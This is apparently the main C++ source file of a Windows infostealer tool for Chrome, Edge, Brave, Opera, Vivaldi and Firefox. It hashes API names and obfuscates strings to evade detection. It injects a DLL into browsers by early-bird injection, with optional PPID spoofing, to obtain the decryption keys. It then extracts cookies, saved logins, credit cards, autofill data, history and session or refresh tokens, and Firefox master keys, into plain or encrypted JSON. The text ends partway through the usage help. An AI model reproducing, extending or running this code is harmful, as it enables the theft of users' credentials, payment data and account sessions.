#include "Headers.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variable

// EXE-owned instance of all resolved functions (shared + EXE-only).
// g_pSharedFunctions (declared in Common.h) points to the inherited base,
// allowing shared code via g_pSharedFunctions-> while EXE-specific code accesses everything through g_ResolvedFunctions

DINMCLY_RSOLVD_FUNCTIONS    g_ResolvedFunctions = {};
PSHARED_RSOLVD_FUNCTIONS    g_pSharedFunctions  = &g_ResolvedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitializeExeProjDynamicFunctions()
{
    HMODULE     hNtdllModule        = NULL,
                hKernel32Module     = NULL,
                hBCryptModule       = NULL,
                hAdvapi32Module     = NULL,
                hCrypt32Module      = NULL;

    if (g_ResolvedFunctions.pInitialized) return TRUE;

    RtlSecureZeroMemory(&g_ResolvedFunctions, sizeof(DINMCLY_RSOLVD_FUNCTIONS));

    if (!(hNtdllModule = GetModuleHandleH(FNV1A_NTDLLDLL)) || !(hKernel32Module = GetModuleHandleH(FNV1A_KERNEL32DLL)))
    {
        DBGA("[!] GetModuleHandleH Failed To Resolve Modules");
        return FALSE;
    }

    if (!(hBCryptModule = LoadLibraryW(OBFW_S(L"bcrypt.dll"))) || !(hAdvapi32Module = LoadLibraryW(OBFW_S(L"advapi32.dll"))) || !(hCrypt32Module = LoadLibraryW(OBFW_S(L"crypt32.dll"))))
    {
        DBGA("[!] LoadLibraryW Failed To Load Required Modules With Error: %lu", GetLastError());
        return FALSE;
    }

    // CRSS Functions
    g_ResolvedFunctions.pBasepConstructSxsCreateProcessMessage        = (fnBasepConstructSxsCreateProcessMessage)GetProcAddressH(hKernel32Module, FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE);
    g_ResolvedFunctions.pCsrCaptureMessageMultiUnicodeStringsInPlace  = (fnCsrCaptureMessageMultiUnicodeStringsInPlace)GetProcAddressH(hNtdllModule, FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE);
    g_ResolvedFunctions.pCsrClientCallServer                          = (fnCsrClientCallServer)GetProcAddressH(hNtdllModule, FNV1A_CSRCLIENTCALLSERVER);

    // NTAPI Functions
    g_ResolvedFunctions.pNtCreateUserProcess                          = (fnNtCreateUserProcess)GetProcAddressH(hNtdllModule, FNV1A_NTCREATEUSERPROCESS);
    g_ResolvedFunctions.pRtlCreateProcessParametersEx                 = (fnRtlCreateProcessParametersEx)GetProcAddressH(hNtdllModule, FNV1A_RTLCREATEPROCESSPARAMETERSEX);
    g_ResolvedFunctions.pRtlDestroyProcessParameters                  = (fnRtlDestroyProcessParameters)GetProcAddressH(hNtdllModule, FNV1A_RTLDESTROYPROCESSPARAMETERS);
    g_ResolvedFunctions.pNtCreateDebugObject                          = (fnNtCreateDebugObject)GetProcAddressH(hNtdllModule, FNV1A_NTCREATEDEBUGOBJECT);
    g_ResolvedFunctions.pNtWaitForDebugEvent                          = (fnNtWaitForDebugEvent)GetProcAddressH(hNtdllModule, FNV1A_NTWAITFORDEBUGEVENT);
    g_ResolvedFunctions.pNtDebugContinue                              = (fnNtDebugContinue)GetProcAddressH(hNtdllModule, FNV1A_NTDEBUGCONTINUE);
    g_ResolvedFunctions.pNtRemoveProcessDebug                         = (fnNtRemoveProcessDebug)GetProcAddressH(hNtdllModule, FNV1A_NTREMOVEPROCESSDEBUG);
    g_ResolvedFunctions.pNtQueryInformationProcess                    = (fnNtQueryInformationProcess)GetProcAddressH(hNtdllModule, FNV1A_NTQUERYINFORMATIONPROCESS);
    g_ResolvedFunctions.pNtQuerySystemInformation                     = (fnNtQuerySystemInformation)GetProcAddressH(hNtdllModule, FNV1A_NTQUERYSYSTEMINFORMATION);
    g_ResolvedFunctions.pNtReadVirtualMemory                          = (fnNtReadVirtualMemory)GetProcAddressH(hNtdllModule, FNV1A_NTREADVIRTUALMEMORY);
    g_ResolvedFunctions.pNtWriteVirtualMemory                         = (fnNtWriteVirtualMemory)GetProcAddressH(hNtdllModule, FNV1A_NTWRITEVIRTUALMEMORY);
    g_ResolvedFunctions.pNtOpenProcessToken                           = (fnNtOpenProcessToken)GetProcAddressH(hNtdllModule, FNV1A_NTOPENPROCESSTOKEN);

    // BCrypt Functions
    g_ResolvedFunctions.pBCryptOpenAlgorithmProvider                   = (decltype(&BCryptOpenAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTOPENALGORITHMPROVIDER);
    g_ResolvedFunctions.pBCryptCloseAlgorithmProvider                  = (decltype(&BCryptCloseAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCLOSEALGORITHMPROVIDER);
    g_ResolvedFunctions.pBCryptSetProperty                             = (decltype(&BCryptSetProperty))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTSETPROPERTY);
    g_ResolvedFunctions.pBCryptGenerateSymmetricKey                    = (decltype(&BCryptGenerateSymmetricKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTGENERATESYMMETRICKEY);
    g_ResolvedFunctions.pBCryptDestroyKey                              = (decltype(&BCryptDestroyKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYKEY);
    g_ResolvedFunctions.pBCryptFinishHash                              = (decltype(&BCryptFinishHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTFINISHHASH);
    g_ResolvedFunctions.pBCryptDestroyHash                             = (decltype(&BCryptDestroyHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYHASH);
    g_ResolvedFunctions.pBCryptHashData                                = (decltype(&BCryptHashData))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTHASHDATA);
    g_ResolvedFunctions.pBCryptCreateHash                              = (decltype(&BCryptCreateHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCREATEHASH);
    g_ResolvedFunctions.pBCryptDecrypt                                 = (decltype(&BCryptDecrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDECRYPT);
    g_ResolvedFunctions.pBCryptDeriveKeyPBKDF2                         = (decltype(&BCryptDeriveKeyPBKDF2))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDERIVEKEYPBKDF2);
    g_ResolvedFunctions.pBCryptEncrypt                                 = (decltype(&BCryptEncrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTENCRYPT);

    // Advapi32 Functions
    g_ResolvedFunctions.pRegOpenKeyExW                                 = (decltype(&RegOpenKeyExW))GetProcAddressH(hAdvapi32Module, FNV1A_REGOPENKEYEXW);
    g_ResolvedFunctions.pRegCloseKey                                   = (decltype(&RegCloseKey))GetProcAddressH(hAdvapi32Module, FNV1A_REGCLOSEKEY);
    g_ResolvedFunctions.pRegQueryValueExW                              = (decltype(&RegQueryValueExW))GetProcAddressH(hAdvapi32Module, FNV1A_REGQUERYVALUEEXW);

    // Crypt32 Functions
    g_ResolvedFunctions.pCryptStringToBinaryA                          = (decltype(&CryptStringToBinaryA))GetProcAddressH(hCrypt32Module, FNV1A_CRYPTSTRINGTOBINARYA);

    // Shared - BCrypt
    if (!g_ResolvedFunctions.pBCryptOpenAlgorithmProvider  || !g_ResolvedFunctions.pBCryptCloseAlgorithmProvider ||
        !g_ResolvedFunctions.pBCryptSetProperty            || !g_ResolvedFunctions.pBCryptGenerateSymmetricKey   ||
        !g_ResolvedFunctions.pBCryptDestroyKey             || !g_ResolvedFunctions.pBCryptFinishHash             ||
        !g_ResolvedFunctions.pBCryptDestroyHash            || !g_ResolvedFunctions.pBCryptHashData               ||
        !g_ResolvedFunctions.pBCryptCreateHash             || !g_ResolvedFunctions.pBCryptDecrypt                ||
        !g_ResolvedFunctions.pBCryptDeriveKeyPBKDF2        || !g_ResolvedFunctions.pBCryptEncrypt)
    {
        DBGA("[!] GetProcAddressH Failed For BCrypt Functions");
        return FALSE;
    }

    // Shared - Crypt32
    if (!g_ResolvedFunctions.pCryptStringToBinaryA)
    {
        DBGA("[!] GetProcAddressH Failed For Crypt32 Functions");
        return FALSE;
    }

    // Shared - NTAPI
    if (!g_ResolvedFunctions.pNtQuerySystemInformation)
    {
        DBGA("[!] GetProcAddressH Failed For Shared NTAPI Functions");
        return FALSE;
    }

    // EXE - NTAPI
    if (!g_ResolvedFunctions.pNtCreateUserProcess          || !g_ResolvedFunctions.pRtlCreateProcessParametersEx  ||
        !g_ResolvedFunctions.pRtlDestroyProcessParameters  || !g_ResolvedFunctions.pNtCreateDebugObject           ||
        !g_ResolvedFunctions.pNtWaitForDebugEvent          || !g_ResolvedFunctions.pNtDebugContinue               ||
        !g_ResolvedFunctions.pNtRemoveProcessDebug         || !g_ResolvedFunctions.pNtQueryInformationProcess     ||
        !g_ResolvedFunctions.pNtReadVirtualMemory          || !g_ResolvedFunctions.pNtWriteVirtualMemory          ||
        !g_ResolvedFunctions.pNtOpenProcessToken)
    {
        DBGA("[!] GetProcAddressH Failed For NTAPI Functions");
        return FALSE;
    }

    // EXE - CSRSS
    if (!g_ResolvedFunctions.pBasepConstructSxsCreateProcessMessage       ||
        !g_ResolvedFunctions.pCsrCaptureMessageMultiUnicodeStringsInPlace ||
        !g_ResolvedFunctions.pCsrClientCallServer)
    {
        DBGA("[!] GetProcAddressH Failed For CSRSS Functions");
        return FALSE;
    }

    // EXE - Advapi32
    if (!g_ResolvedFunctions.pRegOpenKeyExW || !g_ResolvedFunctions.pRegCloseKey || !g_ResolvedFunctions.pRegQueryValueExW)
    {
        DBGA("[!] GetProcAddressH Failed For Advapi32 Functions");
        return FALSE;
    }

    g_ResolvedFunctions.pInitialized = (PVOID)TRUE;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL IsBrowserInstalled(IN BROWSER_TYPE Browser)
{
    WCHAR szBrowserPath[MAX_PATH] = { 0 };
    return GetBrowserPath(Browser, szBrowserPath, MAX_PATH);
}

static BOOL GetDefaultBrowser(OUT BROWSER_TYPE* pBrowser, OUT OPTIONAL LPWSTR szBrowserPath, IN OPTIONAL DWORD dwBrowserPathSize)
{
    WCHAR   szProgId[MAX_PATH]  = { 0 };
    DWORD   dwPathLen           = dwBrowserPathSize,
            dwProgIdLen         = _countof(szProgId);
    HRESULT hResult             = S_OK;

    if (!pBrowser) return FALSE;

    if (szBrowserPath && dwBrowserPathSize)
    {
        if (FAILED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, L"http", L"open", szBrowserPath, &dwPathLen))))
        {
            DBGA("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X", __LINE__, hResult);
            return FALSE;
        }

        if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
        {
            DBGA("[!] GetFileAttributesW Failed For '%ws' With Error: %lu", szBrowserPath, GetLastError());
            return FALSE;
        }
    }

    *pBrowser = BROWSER_UNKNOWN;

    if (SUCCEEDED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_PROGID, L"http", L"open", szProgId, &dwProgIdLen))))
    {
        if (StrCmpIW(szProgId, STR_CHROME_PROGID) == 0)
            *pBrowser = BROWSER_CHROME;
        else if (StrCmpIW(szProgId, STR_BRAVE_PROGID) == 0)
            *pBrowser = BROWSER_BRAVE;
        else if (StrCmpIW(szProgId, STR_EDGE_PROGID) == 0)
            *pBrowser = BROWSER_EDGE;
        else if (StrCmpIW(szProgId, STR_OPERA_PROGID) == 0)
            *pBrowser = BROWSER_OPERA;
        else if (StrCmpIW(szProgId, STR_OPERA_GX_PROGID) == 0)
            *pBrowser = BROWSER_OPERA_GX;
        else if (StrCmpIW(szProgId, STR_VIVALDI_PROGID) == 0)
            *pBrowser = BROWSER_VIVALDI;
        else if (StrCmpIW(szProgId, STR_FIREFOX_PROGID) == 0)
            *pBrowser = BROWSER_FIREFOX;
    }
    else
    {
        DBGA("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X", __LINE__, hResult);
        return FALSE;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CacheBrowserDataFiles(IN BROWSER_TYPE Browser)
{
#define BROWSER_DATA_FILE_TYPE_COUNT 6

    CHAR    szRelPaths[BROWSER_DATA_FILE_TYPE_COUNT][MAX_PATH]  = { 0 };
    LPCSTR  ppszRelPaths[BROWSER_DATA_FILE_TYPE_COUNT]          = { 0 };
    DWORD   dwFileCount                                         = 0x00;

#undef BROWSER_DATA_FILE_TYPE_COUNT

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_COOKIES, szRelPaths[0], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[0];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOGIN_DATA, szRelPaths[1], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[1];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPaths[2], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[2];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_HISTORY, szRelPaths[3], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[3];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_BOOKMARKS, szRelPaths[4], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[4];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPaths[5], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[5];

    if (dwFileCount == 0)
        return FALSE;

    DBGV("[v] Caching %lu Browser Data Files...", dwFileCount);

    return (GetBrowserDataFilePathEx(Browser, ppszRelPaths, dwFileCount) > 0);

}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractFromBrowser(
    IN BROWSER_TYPE Browser, 
    IN LPCSTR       pszOutputFile, 
    IN DWORD        dwMaxEntries,
    IN BOOL         bSpoof,
    IN BOOL         bEncryptJson, 
    IN PBYTE        pbSignature OPTIONAL,
    IN DWORD        dwSignatureLen OPTIONAL
) {
    
    thread_local ENCRYPTED_JSON_PACK    t_EncJsonPack           = { 0 };
    thread_local BOOL                   t_bPackInitialized      = FALSE;
    CHROMIUM_DATA                       ChromiumData            = { 0 };
    BOOL                                bResult                 = FALSE;

    DBGV("[i] Target Browser: %s", GetBrowserName(Browser));

    // Initialize the data structure
    if (!InitializeChromiumData(&ChromiumData))
    {
        DBGA("[!] Failed To Initialize Chromium Data");
        goto _END_OF_FUNC;
    }
    
    if (Browser != BROWSER_FIREFOX)
    {
        // Pre-cache All Browser Data Files 
        // Pre-caching only Works For Chromium Browsers. 
        // Because The `GetXXXPathForBrowser` Getters Dont Handle FireFox Paths
        CacheBrowserDataFiles(Browser);

        // Inject DLL to get decryption keys only
        if (!InjectDllViaEarlyBird(bSpoof, Browser, &ChromiumData))
        {
            DBGA("[!] Failed To Retrieve Decryption Keys");
            goto _END_OF_FUNC;
        }

        DBGV("[+] Retrieved Decryption Keys (V10: %s, V20: %s)", ChromiumData.pbDpapiKey ? "Yes" : "No", ChromiumData.pbAppBoundKey ? "Yes" : "No");

        DBGV("[i] Extracting Browser Data...");

        ExtractCookiesFromDatabase(Browser, &ChromiumData);
        ExtractLoginsFromDatabase(Browser, &ChromiumData);
        ExtractCreditCardsFromDatabase(Browser, &ChromiumData);
        ExtractAutofillFromDatabase(Browser, &ChromiumData);
        ExtractHistoryFromDatabase(Browser, &ChromiumData);
        ExtractBookmarksFromFile(Browser, &ChromiumData);
    
        if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX)
            ExtractOperaAccessTokensFromDatabase(Browser, &ChromiumData);
        else
            ExtractRefreshTokenFromDatabase(Browser, &ChromiumData);
    }
    else
    {
        DBGV("[i] Extracting Browser Data...");

        ExtractFirefoxCookies(&ChromiumData);
        ExtractFirefoxHistory(&ChromiumData);
        ExtractFirefoxBookmarks(&ChromiumData);
        ExtractFirefoxAutofill(&ChromiumData);

        if (!(ChromiumData.pFireFoxBrsrData = (PFIREFOX_BROWSER_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FIREFOX_BROWSER_DATA))))
        {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }

        if (ExtractMasterKeyFromKey4Db(NULL, &ChromiumData.pFireFoxBrsrData->pbMasterKey, &ChromiumData.pFireFoxBrsrData->dwMasterKeyLen))
        {
            LPSTR pszMasterKeyHex = BytesToHexString(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen);
            
            if (pszMasterKeyHex)
            {
                DBGV("[*] Firefox Master Key: %s", pszMasterKeyHex);
                HEAP_FREE(pszMasterKeyHex);
            }

            ExtractFirefoxLogins(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen, &ChromiumData);
        }

        ExtractFirefoxAccountTokens(ChromiumData.pFireFoxBrsrData);
    }

#define PRINT_COUNT(label, count) \
    DBGV("[i] " label "%lu/%lu", min(count, dwMaxEntries), count)

    DBGV("[+] Extraction Complete!");
    if (Browser != BROWSER_FIREFOX)
    {
        PRINT_COUNT("Tokens:         ", ChromiumData.dwTokenCount);
    } 
    else
    {
        if (ChromiumData.pFireFoxBrsrData)
        {
            DBGV("[i] Account Email:  %s", ChromiumData.pFireFoxBrsrData->szEmail ? ChromiumData.pFireFoxBrsrData->szEmail : "N/A");
            DBGV("[i] Session Token:  %s", ChromiumData.pFireFoxBrsrData->szSessionToken ? "Found" : "N/A");
            DBGV("[i] Sync Token:     %s", ChromiumData.pFireFoxBrsrData->szSyncOAuthToken ? "Found" : "N/A");
        }
    }
    if (Browser != BROWSER_FIREFOX)
    {
        PRINT_COUNT("Credit Cards:   ", ChromiumData.dwCreditCardCount);
    }
    PRINT_COUNT("Cookies:        ", ChromiumData.dwCookieCount);
    PRINT_COUNT("Logins:         ", ChromiumData.dwLoginCount);
    PRINT_COUNT("Autofill:       ", ChromiumData.dwAutofillCount);
    PRINT_COUNT("History:        ", ChromiumData.dwHistoryCount);
    PRINT_COUNT("Bookmarks:      ", ChromiumData.dwBookmarkCount);

#undef PRINT_COUNT


    if (!bEncryptJson)
    {
        if (!WriteChromiumDataToJson(&ChromiumData, pszOutputFile, dwMaxEntries))
        {
            DBGA("[!] Failed To Write The %s JSON File", pszOutputFile);
            goto _END_OF_FUNC;
        }
        
        wprintf(L"[+] Extracted Data Is Written To: %S\n", pszOutputFile);
    }
    else
    {
        if (!t_bPackInitialized)
        {
            if (!InitEncryptedJsonPack(&t_EncJsonPack, pbSignature, dwSignatureLen))
                goto _END_OF_FUNC;

            t_bPackInitialized = TRUE;
        }

        if (!WriteChromiumDataToEncJsonPack(&ChromiumData, &t_EncJsonPack, pszOutputFile, dwMaxEntries))
            goto _END_OF_FUNC;

        wprintf(L"[+] %S Was Packed Into: %S\n", pszOutputFile, t_EncJsonPack.szOutputPath);
    }


    wprintf(L"\n");

    bResult = TRUE;

_END_OF_FUNC:
    FreeChromiumData(&ChromiumData);
    DeleteDataFilesCache();
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _CMD_ARGUMENTS
{
    BOOL            bAllBrowsers;
    BOOL            bSpoof;
    BOOL            bEncryptJson;
    BOOL            bDecryptMode;
    BOOL            bTargetDefaultBrowserOnly;
    LPCSTR          pszInputFile;
    DWORD           dwMaxEntries;
    BROWSER_TYPE    BrowserTypes[BROWSER_COUNT];
    DWORD           dwBrowserCount;
    BYTE            Signature[BUFFER_SIZE_08];
    DWORD           dwSignatureLen;

} CMD_ARGUMENTS, *PCMD_ARGUMENTS;

static BROWSER_TYPE ParseBrowserArg(IN LPCSTR pszArg, OUT PBOOL pbAllBrowsers)
{
    // Skip the "/b:" or "-b:" prefix
    LPCSTR pszBrowser = pszArg + 3;

    *pbAllBrowsers = FALSE;

    if (pszBrowser[0] == '\0') return BROWSER_UNKNOWN;

    if (lstrcmpiA(pszBrowser, "all") == 0)
    {
        *pbAllBrowsers = TRUE;
        return BROWSER_CHROME;
    }
    else if (StrStrIA(pszBrowser, STR_CHROME_BRSR_NAME))
        return BROWSER_CHROME;
    else if (StrStrIA(pszBrowser, STR_BRAVE_BRSR_NAME))
        return BROWSER_BRAVE;
    else if (StrStrIA(pszBrowser, STR_EDGE_BRSR_NAME) || StrStrIA(pszBrowser, STR_EDGE_ALT_BRSR_NAME))
        return BROWSER_EDGE;
    else if (StrStrIA(pszBrowser, STR_OPERA_GX_BRSR_NAME) || StrStrIA(pszBrowser, STR_OPERA_ALT_GX_BRSR_NAME))
        return BROWSER_OPERA_GX;
    else if (StrStrIA(pszBrowser, STR_OPERA_BRSR_NAME))
        return BROWSER_OPERA;
    else if (StrStrIA(pszBrowser, STR_VIVALDI_BRSR_NAME))
        return BROWSER_VIVALDI;
    else if (StrStrIA(pszBrowser, STR_FIREFOX_BRSR_NAME))
        return BROWSER_FIREFOX;

    return BROWSER_UNKNOWN;
}

static BOOL ParseSignatureArg(IN LPCSTR pszArg, OUT PBYTE pbSignature, OUT PDWORD pdwSignatureLen)
{
    DWORD   dwLen       = 0x00;
    LPCSTR  pszSig      = pszArg;

    if (!pszArg || !pbSignature || !pdwSignatureLen)
        return FALSE;

    *pdwSignatureLen = 0;

    // Check for hex prefix
    if (pszSig[0] == '0' && (pszSig[1] == 'x' || pszSig[1] == 'X'))
        pszSig += 2;

    dwLen = lstrlenA(pszSig);
    if (dwLen == 0 || dwLen > BUFFER_SIZE_08 * 2)
        return FALSE;

    // Check if valid hex string
    BOOL bIsHex = TRUE;
    for (DWORD i = 0; i < dwLen && bIsHex; i++)
    {
        if (!((pszSig[i] >= '0' && pszSig[i] <= '9') ||
              (pszSig[i] >= 'A' && pszSig[i] <= 'F') ||
              (pszSig[i] >= 'a' && pszSig[i] <= 'f')))
            bIsHex = FALSE;
    }

    if (bIsHex && (dwLen % 2 == 0))
    {
        *pdwSignatureLen = dwLen / 2;
        for (DWORD i = 0; i < *pdwSignatureLen; i++)
        {
            BYTE b = 0;
            for (int j = 0; j < 2; j++)
            {
                b <<= 4;
                CHAR c = pszSig[i * 2 + j];
                if (c >= '0' && c <= '9')
                    b |= (c - '0');
                else if (c >= 'A' && c <= 'F')
                    b |= (c - 'A' + 10);
                else if (c >= 'a' && c <= 'f')
                    b |= (c - 'a' + 10);
            }
            pbSignature[i] = b;
        }
    }
    else
    {
        // Treat as raw string
        *pdwSignatureLen = min(dwLen, BUFFER_SIZE_08);
        RtlCopyMemory(pbSignature, pszSig, *pdwSignatureLen);
    }

    return (*pdwSignatureLen > 0);
}

static BOOL IsBrowserAlreadyAdded(IN BROWSER_TYPE* pTypes, IN DWORD dwCount, IN BROWSER_TYPE Type)
{
    for (DWORD i = 0; i < dwCount; i++)
    {
        if (pTypes[i] == Type) return TRUE;
    }

    return FALSE;
}

static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmdArgs)
{
    LPCSTR pszExeName = PathFindFileNameA(argv[0]);

    if (!pCmdArgs) return FALSE;

    // Initialize defaults
    pCmdArgs->bAllBrowsers              = FALSE;
    pCmdArgs->bSpoof                    = FALSE;
    pCmdArgs->bEncryptJson              = FALSE;
    pCmdArgs->bDecryptMode              = FALSE;
    pCmdArgs->bTargetDefaultBrowserOnly = FALSE;
    pCmdArgs->dwMaxEntries              = MAX_DISPLAY_COUNT;
    pCmdArgs->pszInputFile              = NULL;
    pCmdArgs->dwBrowserCount            = 0x00;
    pCmdArgs->dwSignatureLen            = 0x00;

    RtlZeroMemory(pCmdArgs->BrowserTypes, sizeof(pCmdArgs->BrowserTypes));
    RtlZeroMemory(pCmdArgs->Signature, BUFFER_SIZE_08);

    for (int i = 1; i < argc; i++)
    {
        if (lstrcmpiA(argv[i], "/?") == 0 || lstrcmpiA(argv[i], "-?") == 0 || lstrcmpiA(argv[i], "/h") == 0 || lstrcmpiA(argv[i], "-h") == 0)
        {
            goto _PRINT_HELP;
        }
        else if (StrStrIA(argv[i], "/b:") == argv[i] || StrStrIA(argv[i], "-b:") == argv[i])
        {
            BOOL            bAllBrowsers    = FALSE;
            BROWSER_TYPE    BrowserType     = ParseBrowserArg(argv[i], &bAllBrowsers);

            if (BrowserType == BROWSER_UNKNOWN)
            {
                wprintf(L"[!] Unknown Browser: '%S'\n", argv[i] + 3);
                goto _PRINT_HELP;
            }

            if (bAllBrowsers)
            {
                pCmdArgs->bAllBrowsers = TRUE;
            }
            else if (!IsBrowserAlreadyAdded(pCmdArgs->BrowserTypes, pCmdArgs->dwBrowserCount, BrowserType))
            {
                if (pCmdArgs->dwBrowserCount >= BROWSER_COUNT)
                {
                    wprintf(L"[!] Too Many Browsers Specified (Max: %d)\n", BROWSER_COUNT);
                    goto _PRINT_HELP;
                }
                
                pCmdArgs->BrowserTypes[pCmdArgs->dwBrowserCount++] = BrowserType;
            }
        }
        else if (StrStrIA(argv[i], "/enc:") == argv[i] || StrStrIA(argv[i], "-enc:") == argv[i])
        {
            if (!ParseSignatureArg(argv[i] + 3, pCmdArgs->Signature, &pCmdArgs->dwSignatureLen))
            {
                wprintf(L"[!] Invalid Signature: '%S'\n", argv[i] + 3);
                wprintf(L"[i] Signature Must Be 1-8 Bytes (Hex: 0xDEADBEEF or Raw: MYSIG123)\n");
                goto _PRINT_HELP;
            }
            
            pCmdArgs->bEncryptJson = TRUE;
        }
        else if (StrStrIA(argv[i], "/dec:") == argv[i] || StrStrIA(argv[i], "-dec:") == argv[i])
        {
            if (!ParseSignatureArg(argv[i] + 3, pCmdArgs->Signature, &pCmdArgs->dwSignatureLen))
            {
                wprintf(L"[!] Invalid Signature: '%S'\n", argv[i] + 3);
                wprintf(L"[i] Signature Must Be 1-8 Bytes (Hex: 0xDEADBEEF or Raw: MYSIG123)\n");
                goto _PRINT_HELP;
            }
            pCmdArgs->bDecryptMode = TRUE;
        }
        else if (StrStrIA(argv[i], "/e:") == argv[i] || StrStrIA(argv[i], "-e:") == argv[i])
        {
            LPCSTR pszValue = argv[i] + 3;

            if (lstrcmpiA(pszValue, "all") == 0)
            {
                pCmdArgs->dwMaxEntries = MAXDWORD;
            }
            else
            {
                INT nEntries = StrToIntA(pszValue);
                if (nEntries <= 0)
                {
                    wprintf(L"[!] Invalid Entry Count: '%S'\n", pszValue);
                    goto _PRINT_HELP;
                }
                pCmdArgs->dwMaxEntries = (DWORD)nEntries;
            }
        }
        else if (lstrcmpiA(argv[i], "/spoof") == 0 || lstrcmpiA(argv[i], "-spoof") == 0)
        {
            pCmdArgs->bSpoof = TRUE;
        }
        else if (lstrcmpiA(argv[i], "/i") == 0 || lstrcmpiA(argv[i], "-i") == 0)
        {
            if (i + 1 < argc)
            {
                pCmdArgs->pszInputFile = argv[++i];
            }
            else
            {
                wprintf(L"[!] Error: '/i' Requires A Filename\n");
                goto _PRINT_HELP;
            }
        }
        else
        {
            wprintf(L"[!] Unknown Argument : '%S'\n", argv[i]);
            goto _PRINT_HELP;
        }
    }

    // Decrypt mode validation
    if (pCmdArgs->bDecryptMode)
    {
        if (pCmdArgs->bEncryptJson)
        {
            wprintf(L"[!] Error: Cannot Use '/enc' and '/dec' Together\n");
            goto _PRINT_HELP;
        }

        if (!pCmdArgs->pszInputFile)
        {
            wprintf(L"[!] Error: '/dec' Requires Input File '/i <file>'\n");
            goto _PRINT_HELP;
        }

        // Ignore browser-related args in decrypt mode
        return TRUE;
    }

    // If no browser specified, detect default browser
    if (pCmdArgs->dwBrowserCount == 0 && !pCmdArgs->bAllBrowsers)
    {
        if (!GetDefaultBrowser(&pCmdArgs->BrowserTypes[0], NULL, 0) || pCmdArgs->BrowserTypes[0] == BROWSER_UNKNOWN)
        {
            wprintf(L"[!] Failed To Detect Default Browser\n");
            wprintf(L"[i] Please Specify A Browser With /b:<browser>\n\n");
            goto _PRINT_HELP;
        }

        pCmdArgs->dwBrowserCount            = 1;
        pCmdArgs->bTargetDefaultBrowserOnly = TRUE;
        wprintf(L"[i] No Browser Specified, Targeting The Default Browser\n");
    }

    return TRUE;

_PRINT_HELP:
    wprintf(L"Usage: %S [options]\n\n", pszExeName);
    wprintf(L"Extraction Options:\n");
    wprintf(L"  /b:<browser> Target Browser: Chrome, Edge, Brave, Opera, Operagx, Vivaldi, Firefox, All\n");
    wprintf(L"               Can Be Specified Multiple Times\n");
    wprintf(L"  /enc:<sig>   Encrypt JSON Output With Signature (1-8 Bytes)\n");
    wprintf(L"  /spoof       Enable Argument and PPID Spoofing When Retrieving ABE Keys\n");
    wprintf(L"  /e:<count>   Max Extracted Entries Per Category (Default: %d, 'all' For No Limit)\n\n", MAX_DISPLAY_COUNT);
